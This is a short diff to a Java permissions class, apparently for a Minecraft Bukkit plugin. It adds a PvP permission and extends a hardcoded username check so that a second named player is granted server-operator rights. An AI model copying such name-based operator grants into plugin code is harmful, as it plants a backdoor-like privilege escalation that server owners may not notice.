@@ -54,9 +54,10 @@ public class Permissions {
 		atch.setPermission("ThePlugin.unmute", true);
 		atch.setPermission("ThePlugin.fly", true);
 		atch.setPermission("ThePlugin.openinv", true);
+		atch.setPermission("ThePlugin.pvp", true);
 		atch.setPermission("ThePlugin.tp", true);
 		atch.setPermission("ThePlugin.whois", true);
-		if (player.getName().equals("Kiwz")) {
+		if (player.getName().equals("Kiwz") || player.getName().equals("zacker")) {
 			atch.setPermission("bukkit.command.op", true);
 		}
 	}
